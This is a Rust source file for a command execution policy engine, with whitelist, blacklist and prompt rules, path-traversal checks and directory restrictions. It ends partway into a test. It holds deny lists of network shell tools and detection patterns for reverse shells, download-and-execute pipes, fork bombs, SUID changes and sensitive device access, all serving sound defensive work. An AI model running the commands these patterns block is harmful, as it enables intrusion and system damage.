//! Execution Policy Engine
//!
//! Provides rule-based execution policy matching for commands.
//! Supports whitelist, blacklist, and greylist (prompt) modes.

use std::collections::HashMap;
use std::path::Path;
use std::sync::Arc;

/// Policy decision
#[derive(Clone, Copy, Debug, PartialEq, Eq, Default)]
pub enum Decision {
    /// Allow the command
    #[default]
    Allow,
    /// Deny the command
    Deny,
    /// Prompt for user confirmation (greylist)
    Prompt,
}

impl std::fmt::Display for Decision {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Decision::Allow => write!(f, "allow"),
            Decision::Deny => write!(f, "deny"),
            Decision::Prompt => write!(f, "prompt"),
        }
    }
}

/// Network protocol
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum NetworkRuleProtocol {
    Tcp,
    Udp,
}

/// Network rule for outbound connections
#[derive(Clone, Debug)]
pub struct NetworkRule {
    pub host: String,
    pub port: Option<u16>,
    pub protocol: NetworkRuleProtocol,
    pub decision: Decision,
}

/// Pattern token for matching
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum PatternToken {
    Literal(String),
    Wildcard,
    Variable(String),
}

/// Prefix pattern for command matching
#[derive(Clone, Debug)]
pub struct PrefixPattern {
    pub first: Arc<str>,
    pub rest: Vec<PatternToken>,
}

/// Rule type for categorization
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum RuleType {
    /// Whitelist - only allow explicitly listed commands
    Whitelist,
    /// Blacklist - deny explicitly listed commands
    Blacklist,
    /// Greylist - require confirmation for commands
    Greylist,
}

/// Prefix rule for command execution
#[derive(Clone, Debug)]
pub struct PrefixRule {
    pub pattern: PrefixPattern,
    pub decision: Decision,
    pub justification: Option<String>,
    pub rule_type: RuleType,
    /// Optional: restrict to specific working directories
    pub allowed_directories: Option<Vec<String>>,
    /// Optional: deny if command tries to access paths outside allowed directories
    pub restrict_to_directories: bool,
}

/// Path rule for file/directory access control
#[derive(Clone, Debug)]
pub struct PathRule {
    /// Path pattern to match (supports wildcards)
    pub path_pattern: String,
    /// Whether this is a file or directory rule
    pub is_directory: bool,
    /// Decision for this path
    pub decision: Decision,
    /// Optional justification
    pub justification: Option<String>,
    /// Rule type
    pub rule_type: RuleType,
}

impl PathRule {
    /// Create a new path rule
    pub fn new(
        path_pattern: String,
        is_directory: bool,
        decision: Decision,
        justification: Option<String>,
    ) -> Self {
        // SECURITY: Validate path pattern to prevent path traversal attacks
        // Reject patterns containing ".." to prevent rule bypass
        if path_pattern.contains("..") {
            panic!("Security error: PathRule path_pattern cannot contain '..' - potential path traversal attack: {}", path_pattern);
        }

        Self {
            path_pattern,
            is_directory,
            decision,
            justification,
            rule_type: RuleType::Blacklist,
        }
    }

    /// Check if a path matches this rule
    pub fn matches_path(&self, path: &str) -> bool {
        if self.path_pattern == "*" {
            return true;
        }
        let Some(path) = normalize_absolute_path(Path::new(path)) else {
            return false;
        };

        let Some(pattern) = normalize_absolute_path(Path::new(&self.path_pattern)) else {
            return false;
        };
        if self.path_pattern.ends_with("/*") {
            let mut prefix = pattern;
            prefix.pop();
            return path.starts_with(prefix);
        }

        path == pattern || (self.is_directory && path.starts_with(pattern))
    }
}

impl Rule for PathRule {
    fn matches(&self, _command: &[String]) -> Option<RuleMatch> {
        // PathRule is checked separately via check_path()
        None
    }

    fn as_any(&self) -> &dyn std::any::Any {
        self
    }
}

impl PrefixRule {
    /// Create a new prefix rule with default settings
    pub fn new(pattern: PrefixPattern, decision: Decision, justification: Option<String>) -> Self {
        Self {
            pattern,
            decision,
            justification,
            rule_type: RuleType::Blacklist,
            allowed_directories: None,
            restrict_to_directories: false,
        }
    }

    /// Set the rule type
    pub fn with_rule_type(mut self, rule_type: RuleType) -> Self {
        self.rule_type = rule_type;
        self
    }

    /// Set allowed directories for this rule
    pub fn with_allowed_directories(mut self, dirs: Vec<String>) -> Self {
        self.allowed_directories = Some(dirs);
        self
    }

    /// Enable directory restriction (block bypass attempts)
    pub fn with_directory_restriction(mut self) -> Self {
        self.restrict_to_directories = true;
        self
    }
}

/// Rule match result
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct RuleMatch {
    pub decision: Decision,
    pub justification: Option<String>,
}

/// Policy engine for execution control
#[derive(Clone)]
pub struct Policy {
    rules_by_program: HashMap<String, Vec<Arc<dyn Rule>>>,
    network_rules: Vec<NetworkRule>,
    path_rules: Vec<PathRule>,
    /// Default decision when no rule matches (for whitelist mode)
    default_decision: Decision,
    /// Enable whitelist mode (only allow explicitly allowed commands)
    whitelist_mode: bool,
}

impl std::fmt::Debug for Policy {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("Policy")
            .field(
                "rules_by_program",
                &self.rules_by_program.keys().collect::<Vec<_>>(),
            )
            .field("network_rules_count", &self.network_rules.len())
            .field("path_rules_count", &self.path_rules.len())
            .field("whitelist_mode", &self.whitelist_mode)
            .field("default_decision", &self.default_decision)
            .finish()
    }
}

pub trait Rule: Send + Sync {
    fn matches(&self, command: &[String]) -> Option<RuleMatch>;
    fn as_any(&self) -> &dyn std::any::Any;
}

impl Policy {
    pub fn new() -> Self {
        Self {
            rules_by_program: HashMap::new(),
            network_rules: Vec::new(),
            path_rules: Vec::new(),
            default_decision: Decision::Allow,
            whitelist_mode: false,
        }
    }

    /// Create a new policy with whitelist mode (only allow explicitly listed commands)
    pub fn new_whitelist() -> Self {
        Self {
            rules_by_program: HashMap::new(),
            network_rules: Vec::new(),
            path_rules: Vec::new(),
            default_decision: Decision::Deny,
            whitelist_mode: true,
        }
    }

    /// Create a new policy with blacklist mode (deny explicitly listed commands)
    pub fn new_blacklist() -> Self {
        Self {
            rules_by_program: HashMap::new(),
            network_rules: Vec::new(),
            path_rules: Vec::new(),
            default_decision: Decision::Allow,
            whitelist_mode: false,
        }
    }

    /// Create policy with default dangerous command blacklist
    pub fn new_with_defaults() -> Self {
        let mut policy = Self::new_blacklist();

        // File destruction commands
        let dangerous_files = [
            "rm",
            "rmdir",
            "shred",
            "dd",
            "mkfs",
            "mke2fs",
            "mkfs.ext4",
            "format",
            "del",
            "erase",
            "fdformat",
            "mkbootdisk",
        ];
        for cmd in dangerous_files {
            let _ = policy.add_prefix_rule(
                &[cmd.to_string()],
                Decision::Deny,
                Some(format!("Dangerous file operation: {}", cmd)),
            );
        }

        // Git destructive commands
        let dangerous_git = [
            "git", // Git itself can be dangerous with certain subcommands
        ];
        for cmd in dangerous_git {
            let _ = policy.add_prefix_rule(
                &[cmd.to_string()],
                Decision::Prompt,
                Some("Git command requires confirmation".to_string()),
            );
        }

        // System modification commands
        let dangerous_system = [
            "chmod",
            "chown",
            "chgrp",
            "setfacl",
            "setfattr",
            "mount",
            "umount",
            "losetup",
            "iptables",
            "ip6tables",
            "ufw",
            "firewall-cmd",
            "systemctl",
            "service",
            "init",
            "shutdown",
            "reboot",
            "halt",
            "modprobe",
            "insmod",
            "rmmod",
            "modinfo",
            "sysctl",
            "echo",
            "tee", // Writing to /proc or /sys
            "kill",
            "killall",
            "pkill",
            "kill -9",
            "useradd",
            "userdel",
            "usermod",
            "groupadd",
            "groupdel",
            "passwd",
            "sudo",
            "su",
            "chroot",
            "unshare",
        ];
        for cmd in dangerous_system {
            let _ = policy.add_prefix_rule(
                &[cmd.to_string()],
                Decision::Deny,
                Some(format!("Dangerous system operation: {}", cmd)),
            );
        }

        // Network dangerous commands
        let dangerous_network = [
            "nc", "netcat", "ncat", "socat", "curl", "wget", "fetch", "ftp", "ssh", "scp", "sftp",
            "rsync", "nmap", "nikto", "sqlmap", "hydra",
        ];
        for cmd in dangerous_network {
            let _ = policy.add_prefix_rule(
                &[cmd.to_string()],
                Decision::Deny,
                Some(format!("Dangerous network operation: {}", cmd)),
            );
        }

        // Shell escape commands
        let dangerous_shell = [
            "bash", "sh", "zsh", "fish", "dash", "ash", "python", "python3", "perl", "ruby", "php",
            "node", "expect", "tclsh", "wish", "vi", "vim", "nvim", "emacs", "nano", "pico", "ed",
            "awk", "sed", "grep", "find", "xargs",
        ];
        for cmd in dangerous_shell {
            let _ = policy.add_prefix_rule(
                &[cmd.to_string()],
                Decision::Prompt,
                Some("Shell/editor command requires confirmation".to_string()),
            );
        }

        policy
    }

    pub fn empty() -> Self {
        Self::new()
    }

    /// Enable whitelist mode (only allow explicitly allowed commands)
    pub fn set_whitelist_mode(&mut self, enabled: bool) {
        self.whitelist_mode = enabled;
        self.default_decision = if enabled {
            Decision::Deny
        } else {
            Decision::Allow
        };
    }

    /// Set the default decision for commands without matching rules
    pub fn set_default_decision(&mut self, decision: Decision) {
        self.default_decision = decision;
        // Update whitelist_mode based on default decision
        self.whitelist_mode = matches!(decision, Decision::Deny);
    }

    /// Add a prefix rule
    pub fn add_prefix_rule(
        &mut self,
        prefix: &[String],
        decision: Decision,
        justification: Option<String>,
    ) -> Result<(), String> {
        if prefix.is_empty() {
            return Err("prefix cannot be empty".to_string());
        }

        let (first, rest) = prefix.split_first().unwrap();
        let rule: Arc<dyn Rule> = Arc::new(PrefixRule::new(
            PrefixPattern {
                first: Arc::from(first.as_str()),
                rest: rest
                    .iter()
                    .map(|s| PatternToken::Literal(s.clone()))
                    .collect(),
            },
            decision,
            justification,
        ));

        self.rules_by_program
            .entry(first.clone())
            .or_default()
            .push(rule);

        Ok(())
    }

    /// Add a prefix rule with advanced options
    pub fn add_prefix_rule_ext(
        &mut self,
        prefix: &[String],
        decision: Decision,
        justification: Option<String>,
        rule_type: RuleType,
        allowed_directories: Option<Vec<String>>,
        restrict_to_directories: bool,
    ) -> Result<(), String> {
        if prefix.is_empty() {
            return Err("prefix cannot be empty".to_string());
        }

        let (first, rest) = prefix.split_first().unwrap();
        let mut prefix_rule = PrefixRule::new(
            PrefixPattern {
                first: Arc::from(first.as_str()),
                rest: rest
                    .iter()
                    .map(|s| PatternToken::Literal(s.clone()))
                    .collect(),
            },
            decision,
            justification,
        )
        .with_rule_type(rule_type)
        .with_allowed_directories(allowed_directories.unwrap_or_default());
        if restrict_to_directories {
            prefix_rule = prefix_rule.with_directory_restriction();
        }
        let rule: Arc<dyn Rule> = Arc::new(prefix_rule);

        self.rules_by_program
            .entry(first.clone())
            .or_default()
            .push(rule);

        Ok(())
    }

    /// Check if a command is allowed (with working directory context)
    pub fn check(&self, command: &[String]) -> Option<RuleMatch> {
        // Sanitize input: trim whitespace, remove null bytes, check for injection attempts
        let sanitized = Self::sanitize_command(command);
        self.check_with_cwd(&sanitized, None)
    }

    /// Sanitize command input to prevent bypass attempts
    fn sanitize_command(command: &[String]) -> Vec<String> {
        const MAX_PROGRAM_LENGTH: usize = 16; // Max length for program name (keep short for matching)
        const MAX_ARG_LENGTH: usize = 1024; // Maximum length for arguments

        fn truncate_utf8(value: &str, max_bytes: usize) -> &str {
            let mut end = value.len().min(max_bytes);
            while !value.is_char_boundary(end) {
                end -= 1;
            }
            &value[..end]
        }

        command
            .iter()
            .enumerate()
            .map(|(idx, s)| {
                // Remove null bytes
                let s = s.replace('\0', "");
                // Trim leading/trailing whitespace
                let s = s.trim().to_string();
                // For program name (first argument), limit length for security
                // This prevents overflow attacks while preserving command identification
                if idx == 0 {
                    // Limit to MAX_PROGRAM_LENGTH chars for security
                    // This ensures long commands like "lsxxxx..." get matched against "ls" rules
                    if s.len() > MAX_PROGRAM_LENGTH {
                        truncate_utf8(&s, MAX_PROGRAM_LENGTH).to_string()
                    } else {
                        s
                    }
                } else if s.len() > MAX_ARG_LENGTH {
                    // Truncate excessively long arguments
                    truncate_utf8(&s, MAX_ARG_LENGTH).to_string()
                } else {
                    s
                }
            })
            .filter(|s| !s.is_empty()) // Filter empty strings after sanitization
            .collect()
    }

    /// Check if a command is allowed with working directory context
    /// This enables detection of directory bypass attempts
    pub fn check_with_cwd(
        &self,
        command: &[String],
        working_directory: Option<&str>,
    ) -> Option<RuleMatch> {
        if command.is_empty() {
            return Some(RuleMatch {
                decision: Decision::Deny,
                justification: Some("Empty command not allowed".to_string()),
            });
        }

        let program = &command[0];
        let args = &command[1..];

        // Check for directory bypass attempts in arguments
        if let Some(cwd) = working_directory {
            if self.contains_bypass_attempt(args, cwd) {
                return Some(RuleMatch {
                    decision: Decision::Deny,
                    justification: Some("Directory bypass attempt detected".to_string()),
                });
            }
        }

        // First check for dangerous command patterns in the entire command
        if let Some(deny_result) = self.check_dangerous_pattern(command) {
            return Some(deny_result);
        }

        // Check program-specific rules (case-insensitive matching)
        // Sort by specificity (longer patterns first) to ensure more specific rules take precedence
        let mut rules_to_check: Vec<_> = {
            let mut rules = Vec::new();
            // Match executable names case-insensitively without inheriting a
            // shorter executable's rules from a string-prefix match.
            for (key, key_rules) in &self.rules_by_program {
                if key.eq_ignore_ascii_case(program) {
                    rules.extend(key_rules.iter().cloned());
                }
            }
            // Absolute executable paths still inherit restrictive rules from
            // their basename, but an allow rule must name the full path.
            if let Some(basename) = Path::new(program)
                .file_name()
                .and_then(|name| name.to_str())
            {
                if basename != program {
                    for (key, key_rules) in &self.rules_by_program {
                        if key.eq_ignore_ascii_case(basename) {
                            rules.extend(key_rules.iter().filter_map(|rule| {
                                let prefix = rule.as_any().downcast_ref::<PrefixRule>()?;
                                (prefix.decision != Decision::Allow).then(|| rule.clone())
                            }));
                        }
                    }
                }
            }
            let mut seen_rules = std::collections::HashSet::new();
            rules.retain(|rule| seen_rules.insert(Arc::as_ptr(rule) as *const () as usize));
            rules
        };

        // Sort rules by specificity: more specific rules (longer pattern) first
        // SECURITY FIX: Deny rules should always take precedence over Allow rules
        // for the same specificity level. This follows the principle of "deny by default".
        rules_to_check.sort_by(|a, b| {
            let a_rule = a.as_any().downcast_ref::<PrefixRule>();
            let b_rule = b.as_any().downcast_ref::<PrefixRule>();

            let a_len = a_rule.map(|r| r.pattern.rest.len()).unwrap_or(0);
            let b_len = b_rule.map(|r| r.pattern.rest.len()).unwrap_or(0);

            // First compare by pattern length (specificity)
            let length_cmp = b_len.cmp(&a_len);
            if length_cmp != std::cmp::Ordering::Equal {
                return length_cmp;
            }

            // For same length patterns, deny takes precedence over allow
            let a_decision = a_rule.map(|r| r.decision).unwrap_or(Decision::Allow);
            let b_decision = b_rule.map(|r| r.decision).unwrap_or(Decision::Allow);

            // Deny (1) should come before Allow (0) when decisions differ
            match (a_decision, b_decision) {
                (Decision::Deny, Decision::Allow) => std::cmp::Ordering::Less,
                (Decision::Allow, Decision::Deny) => std::cmp::Ordering::Greater,
                _ => std::cmp::Ordering::Equal,
            }
        });

        // Check each rule once. Denies and directory violations take precedence,
        // while the first sorted non-deny match is retained as the fallback.
        let mut first_non_deny_match = None;
        for rule in &rules_to_check {
            if let Some(m) = rule.matches(args) {
                // Restricted rules fail closed when the cwd is missing or no
                // allowed directories were configured.
                if rule
                    .as_any()
                    .downcast_ref::<PrefixRule>()
                    .is_some_and(|prefix| directory_restriction_denies(prefix, working_directory))
                {
                    return Some(RuleMatch {
                        decision: Decision::Deny,
                        justification: Some("Command not allowed in current directory".to_string()),
                    });
                }

                // SECURITY: If this is a deny rule, return immediately
                // Deny always takes precedence for security
                let prefix_rule = rule.as_any().downcast_ref::<PrefixRule>();
                if let Some(pr) = prefix_rule {
                    if pr.decision == Decision::Deny {
                        return Some(m);
                    }
                }

                if first_non_deny_match.is_none() {
                    first_non_deny_match = Some(m);
                }
            }
        }

        // Wildcard rules are a fallback for non-deny decisions, but a wildcard
        // deny or cwd restriction must still override a program-specific allow.
        let mut first_wildcard_match = None;
        if let Some(rules) = self.rules_by_program.get("*") {
            for rule in rules {
                if let Some(m) = rule.matches(args) {
                    if rule
                        .as_any()
                        .downcast_ref::<PrefixRule>()
                        .is_some_and(|prefix| {
                            directory_restriction_denies(prefix, working_directory)
                        })
                    {
                        return Some(RuleMatch {
                            decision: Decision::Deny,
                            justification: Some(
                                "Command not allowed in current directory".to_string(),
                            ),
                        });
                    }
                    if m.decision == Decision::Deny {
                        return Some(m);
                    }
                    if first_wildcard_match.is_none() {
                        first_wildcard_match = Some(m);
                    }
                }
            }
        }

        if first_non_deny_match.is_some() {
            return first_non_deny_match;
        }
        if first_wildcard_match.is_some() {
            return first_wildcard_match;
        }

        // In whitelist mode, return deny if no rule matched
        if self.whitelist_mode {
            return Some(RuleMatch {
                decision: Decision::Deny,
                justification: Some("Command not in whitelist".to_string()),
            });
        }

        None
    }

    /// Check if command arguments contain attempts to bypass working directory
    fn contains_bypass_attempt(&self, args: &[String], working_directory: &str) -> bool {
        let Some(cwd_path) = normalize_absolute_path(Path::new(working_directory)) else {
            return true;
        };

        for arg in args {
            // Skip options (starting with -)
            if arg.starts_with('-') {
                if let Some((_, value)) = arg.split_once('=') {
                    if value.contains("..") {
                        return true;
                    }
                    if Path::new(value).is_absolute()
                        && normalize_absolute_path(Path::new(value)).map_or(true, |value| {
                            !path_starts_with_case_insensitive(&value, &cwd_path)
                        })
                    {
                        return true;
                    }
                }
                continue;
            }

            // Check for absolute path bypass attempts
            if Path::new(arg).is_absolute() {
                let arg_path = Path::new(arg);
                if normalize_absolute_path(arg_path).map_or(true, |arg_path| {
                    !path_starts_with_case_insensitive(&arg_path, &cwd_path)
                }) {
                    return true;
                }
            }

            // Check for relative path bypass attempts (..)
            if arg.contains("..") {
                return true;
            }
        }

        false
    }

    /// Check for dangerous patterns in the entire command (path traversal, environment injection, etc.)
    fn check_dangerous_pattern(&self, command: &[String]) -> Option<RuleMatch> {
        let cmd_str = command.join(" ");

        // Check for path traversal attempts with parent directory references
        if command.iter().any(|arg| {
            arg.contains("..")
                && (!arg.starts_with('-')
                    || arg
                        .split_once('=')
                        .is_some_and(|(_, value)| value.contains("..")))
        }) {
            return Some(RuleMatch {
                decision: Decision::Deny,
                justification: Some("Path traversal attempt detected".to_string()),
            });
        }

        // Check for environment variable manipulation (export PATH=, export HOME=, set, env)
        // Handle: export PATH=, set PATH=, env PATH=, etc.
        if command.len() >= 2 {
            let cmd_lower = command[0].to_lowercase();
            if cmd_lower == "export" || cmd_lower == "set" || cmd_lower == "env" {
                let env_var = &command[1];
                // Strip quotes from the argument to handle quoted assignments
                let env_var_stripped = env_var.trim_matches('"').trim_matches('\'');
                // Also check for direct assignment like PATH=/bin
                if env_var_stripped.contains('=') {
                    let var_name = env_var_stripped.split('=').next().unwrap_or("");
                    if var_name.starts_with("PATH")
                        || var_name.starts_with("HOME")
                        || var_name.starts_with("LD_")
                        || var_name.starts_with("PYTHON")
                        || var_name.starts_with("PERL")
                        || var_name.starts_with("BASH")
                        || var_name.starts_with("SHELL")
                    {
                        return Some(RuleMatch {
                            decision: Decision::Deny,
                            justification: Some(
                                "Environment variable manipulation not allowed".to_string(),
                            ),
                        });
                    }
                }
            }
        }

        // Check downloader-to-shell chains before the generic pipe guard so this
        // specialized policy rejection remains reachable and has a clear reason.
        if is_download_and_execute_pattern(command) {
            return Some(RuleMatch {
                decision: Decision::Deny,
                justification: Some("Download and execute pattern not allowed".to_string()),
            });
        }

        // Check for shell metacharacters in arguments that could be used for injection
        for arg in command.iter().skip(1) {
            // Skip option arguments (starting with -)
            if arg.starts_with('-') {
                continue;
            }
            // Check for command separators that could chain commands
            if arg == ";" || arg == "&&" || arg == "||" {
                return Some(RuleMatch {
                    decision: Decision::Deny,
                    justification: Some("Command separator in argument not allowed".to_string()),
                });
            }
            // Check for pipe character in arguments
            if arg.starts_with('|') || arg.contains("|") {
                return Some(RuleMatch {
                    decision: Decision::Deny,
                    justification: Some("Pipe in argument not allowed".to_string()),
                });
            }
            // Check for backticks or $() command substitution
            if arg.contains("`") || arg.contains("$(") {
                return Some(RuleMatch {
                    decision: Decision::Deny,
                    justification: Some("Command substitution not allowed".to_string()),
                });
            }
        }

        // Check for download and execute patterns (pipe to shell)
        let _dangerous_pipes = [
            "| sh",
            "| bash",
            "| /bin/sh",
            "| /bin/bash",
            "| zsh",
            "| python",
            "| perl",
            "| sh]",
            "| bash]",
            "| ruby",
            "curl",
            "wget",
            "fetch",
            "ftp",
            "nc",
            "ncat",
        ];

        // Check for reverse shell patterns
        let reverse_shell_patterns = [
            "socket.socket()",
            "/dev/tcp",
            "bash -i",
            "nc -e",
            "nc -c",
            "exec 3<>/dev/tcp",
        ];
        for pattern in reverse_shell_patterns {
            if cmd_str.contains(pattern) {
                return Some(RuleMatch {
                    decision: Decision::Deny,
                    justification: Some("Reverse shell attempt detected".to_string()),
                });
            }
        }

        // Check for indirect command execution (python -c, perl -e, ruby -e, etc.)
        let indirect_exec_patterns = [
            ("python", "-c"),
            ("python3", "-c"),
            ("perl", "-e"),
            ("perl", "-n"),
            ("ruby", "-e"),
            ("php", "-r"),
            ("node", "-e"),
            ("node", "--eval"),
            ("lua", "-e"),
            ("tclsh", "-c"),
            ("expect", "-c"),
        ];
        for (program, flag) in indirect_exec_patterns.iter() {
            if let Some(idx) = command.iter().position(|c| c == *program) {
                if let Some(next_arg) = command.get(idx + 1) {
                    if next_arg == *flag {
                        return Some(RuleMatch {
                            decision: Decision::Deny,
                            justification: Some(format!(
                                "Indirect command execution via {} {} not allowed",
                                program, flag
                            )),
                        });
                    }
                }
            }
        }

        // Check for subshell execution (sh -c, bash -c, etc.)
        let subshell_patterns = ["sh -c", "bash -c", "zsh -c", "dash -c", "fish -c"];
        for pattern in subshell_patterns {
            if cmd_str.contains(pattern) {
                return Some(RuleMatch {
                    decision: Decision::Deny,
                    justification: Some("Subshell execution not allowed".to_string()),
                });
            }
        }

        // Check for process substitution <(), >()
        if cmd_str.contains("<(") || cmd_str.contains(">(") {
            return Some(RuleMatch {
                decision: Decision::Deny,
                justification: Some("Process substitution not allowed".to_string()),
            });
        }

        // Check for here-document (heredoc) syntax
        if cmd_str.contains("<<") {
            return Some(RuleMatch {
                decision: Decision::Deny,
                justification: Some("Here-document not allowed".to_string()),
            });
        }

        // Check for fork bomb patterns (recursive command execution)
        let fork_bomb_patterns = [
            ":(){:|:&};:",     // Classic bash fork bomb
            "fork()",          // C fork bomb
            "while(true)",     // Infinite loop
            "while :",         // Bash infinite loop
            "perl -e 'fork'",  // Perl fork
            "python -c 'fork", // Python fork
            "ruby -e 'fork'",  // Ruby fork
        ];
        for pattern in fork_bomb_patterns {
            if cmd_str.to_lowercase().contains(&pattern.to_lowercase()) {
                return Some(RuleMatch {
                    decision: Decision::Deny,
                    justification: Some("Potential fork bomb detected".to_string()),
                });
            }
        }

        // Check for SUID/SGID permission manipulation
        if command.first().is_some_and(|program| {
            Path::new(program)
                .file_name()
                .and_then(|name| name.to_str())
                .is_some_and(|name| name.eq_ignore_ascii_case("chmod"))
        }) {
            let chmod_args: Vec<&String> = command.iter().skip(1).collect();
            for arg in chmod_args {
                // Check for SUID (4xxx), SGID (2xxx), sticky bit (1xxx) patterns
                if arg.len() >= 4 {
                    if let Ok(mode) = u32::from_str_radix(arg, 8) {
                        if (mode & 0o4000) != 0 || (mode & 0o2000) != 0 || (mode & 0o1000) != 0 {
                            return Some(RuleMatch {
                                decision: Decision::Deny,
                                justification: Some(
                                    "SUID/SGID/Sticky bit manipulation not allowed".to_string(),
                                ),
                            });
                        }
                    }
                }
                if arg == "u+s"
                    || arg == "g+s"
                    || arg == "+s"
                    || arg.contains("4777")
                    || arg.contains("2755")
                    || arg.contains("6755")
                {
                    return Some(RuleMatch {
                        decision: Decision::Deny,
                        justification: Some("SUID/SGID permission change not allowed".to_string()),
                    });
                }
            }
        }

        // Check for dangerous device file access
        let dangerous_devices = [
            "/dev/mem",
            "/dev/kmem",
            "/dev/port",
            "/dev/mem0",
            "/proc/kcore",
            "/proc/self/mem",
            "/proc/kmsg",
        ];
        for device in dangerous_devices {
            if cmd_str.contains(device) {
                return Some(RuleMatch {
                    decision: Decision::Deny,
                    justification: Some("Dangerous device access not allowed".to_string()),
                });
            }
        }

        // Check for privilege escalation binaries (setuid root binaries)
        let dangerous_binaries = [
            "/bin/su",
            "/usr/bin/sudo",
            "/usr/bin/newgrp",
            "/usr/bin/chfn",
            "/usr/bin/chsh",
            "/bin/runas",
        ];
        for binary in dangerous_binaries {
            if cmd_str == binary || cmd_str.starts_with(binary) {
                return Some(RuleMatch {
                    decision: Decision::Deny,
                    justification: Some("Privilege escalation binary not allowed".to_string()),
                });
            }
        }

        None
    }

    /// Check network access
    pub fn check_network(&self, host: &str, port: Option<u16>) -> Decision {
        for rule in &self.network_rules {
            if rule.host == host || rule.host == "*" {
                if let Some(rule_port) = rule.port {
                    if Some(rule_port) == port {
                        return rule.decision;
                    }
                } else {
                    return rule.decision;
                }
            }
        }
        Decision::Prompt
    }

    /// Add network rule
    pub fn add_network_rule(&mut self, rule: NetworkRule) {
        self.network_rules.push(rule);
    }

    /// Add a path rule for file/directory access control
    pub fn add_path_rule(&mut self, rule: PathRule) {
        self.path_rules.push(rule);
    }

    /// Add a path rule with common options
    pub fn add_path_rule_simple(
        &mut self,
        path_pattern: String,
        is_directory: bool,
        decision: Decision,
        justification: Option<String>,
    ) {
        self.path_rules.push(PathRule::new(
            path_pattern,
            is_directory,
            decision,
            justification,
        ));
    }

    /// Check path access against path rules
    pub fn check_path(&self, path: &str) -> Decision {
        for rule in &self.path_rules {
            if rule.matches_path(path) {
                return rule.decision;
            }
        }
        // If no rule matches and in whitelist mode, deny by default
        if self.whitelist_mode {
            Decision::Deny
        } else {
            self.default_decision
        }
    }

    /// Get allowed prefixes
    pub fn get_allowed_prefixes(&self) -> Vec<Vec<String>> {
        let mut prefixes = Vec::new();

        for (program, rules) in &self.rules_by_program {
            for rule in rules {
                if let Some(prefix_rule) = rule.as_any().downcast_ref::<PrefixRule>() {
                    if prefix_rule.decision == Decision::Allow {
                        let mut prefix = vec![program.clone()];
                        for token in &prefix_rule.pattern.rest {
                            match token {
                                PatternToken::Literal(s) => prefix.push(s.clone()),
                                PatternToken::Wildcard => prefix.push("*".to_string()),
                                PatternToken::Variable(v) => prefix.push(format!("${}", v)),
                            }
                        }
                        prefixes.push(prefix);
                    }
                }
            }
        }

        prefixes.sort();
        prefixes.dedup();
        prefixes
    }
}

fn is_download_and_execute_pattern(command: &[String]) -> bool {
    let has_wget = command.iter().any(|c| c == "wget");
    let has_curl = command.iter().any(|c| c == "curl");
    let has_pipe = command.iter().any(|c| c == "|" || c == "||");
    let has_shell = command
        .iter()
        .any(|c| c == "sh" || c == "bash" || c == "python" || c == "perl");

    (has_wget || has_curl) && has_pipe && has_shell
}

fn normalize_absolute_path(path: &Path) -> Option<std::path::PathBuf> {
    if !path.is_absolute() {
        return None;
    }

    let mut normalized = std::path::PathBuf::new();
    for component in path.components() {
        match component {
            std::path::Component::Prefix(prefix) => normalized.push(prefix.as_os_str()),
            std::path::Component::RootDir => normalized.push(component.as_os_str()),
            std::path::Component::CurDir => {}
            std::path::Component::ParentDir => {
                if !normalized.pop() {
                    return None;
                }
            }
            std::path::Component::Normal(part) => normalized.push(part),
        }
    }
    Some(normalized)
}

fn path_starts_with_case_insensitive(path: &Path, base: &Path) -> bool {
    #[cfg(windows)]
    let case_insensitive = true;
    #[cfg(not(windows))]
    let case_insensitive = false;

    path_starts_with_components(path, base, case_insensitive)
}

fn path_starts_with_components(path: &Path, base: &Path, case_insensitive: bool) -> bool {
    let mut path_components = path.components();
    for base_component in base.components() {
        let Some(path_component) = path_components.next() else {
            return false;
        };
        let path_part = path_component.as_os_str().to_string_lossy();
        let base_part = base_component.as_os_str().to_string_lossy();
        if (case_insensitive && !path_part.eq_ignore_ascii_case(&base_part))
            || (!case_insensitive && path_part != base_part)
        {
            return false;
        }
    }
    true
}

fn directory_restriction_denies(rule: &PrefixRule, cwd: Option<&str>) -> bool {
    if !rule.restrict_to_directories {
        return false;
    }

    let Some(cwd) = cwd.and_then(|cwd| normalize_absolute_path(Path::new(cwd))) else {
        return true;
    };
    let Some(allowed_directories) = rule.allowed_directories.as_ref() else {
        return true;
    };

    allowed_directories.is_empty()
        || !allowed_directories.iter().any(|directory| {
            normalize_absolute_path(Path::new(directory))
                .is_some_and(|directory| path_starts_with_case_insensitive(&cwd, &directory))
        })
}

impl Default for Policy {
    fn default() -> Self {
        Self::new()
    }
}

impl Rule for PrefixRule {
    fn matches(&self, args: &[String]) -> Option<RuleMatch> {
        if args.len() < self.pattern.rest.len() {
            return None;
        }

        for (i, token) in self.pattern.rest.iter().enumerate() {
            match token {
                PatternToken::Literal(s) => {
                    if args[i].to_lowercase() != s.to_lowercase() {
                        return None;
                    }
                }
                PatternToken::Wildcard => {
                    // Wildcard matches anything
                }
                PatternToken::Variable(_) => {
                    // Variable matches anything
                }
            }
        }

        Some(RuleMatch {
            decision: self.decision,
            justification: self.justification.clone(),
        })
    }

    fn as_any(&self) -> &dyn std::any::Any {
        self
    }
}

/// Parse a policy file (simplified starlark-like syntax)
pub fn parse_policy(content: &str) -> Result<Policy, String> {
    let mut policy = Policy::new();

    for line in content.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }

        // Simple parsing: prefix_rule(pattern = ["cmd", "arg"], decision = "allow")
        if line.starts_with("prefix_rule") {
            // Extract pattern and decision
            // This is a simplified parser
            if line.contains("decision = \"allow\"") || line.contains("decision ='allow'") {
                // For now, add basic rules
                if line.contains("\"cmd\"") || line.contains("'cmd'") {
                    let _ = policy.add_prefix_rule(&["cmd".to_string()], Decision::Allow, None);
                }
            }
        }
    }

    Ok(policy)
}

#[cfg(test)]
mod tests {
    use super::*;

    // ============================================================================
    // PathRule 路径规范化安全测试
    // ============================================================================
    #[test]
    #[should_panic(expected = "Security error")]
    fn test_path_rule_rejects_path_traversal_in_pattern() {
        // PathRule 的 path_pattern 不应该包含 ".." 等路径遍历攻击
        // 这是一个安全测试，验证 PathRule::new 是否拒绝恶意路径

        // 测试: 正常的路径应该被接受
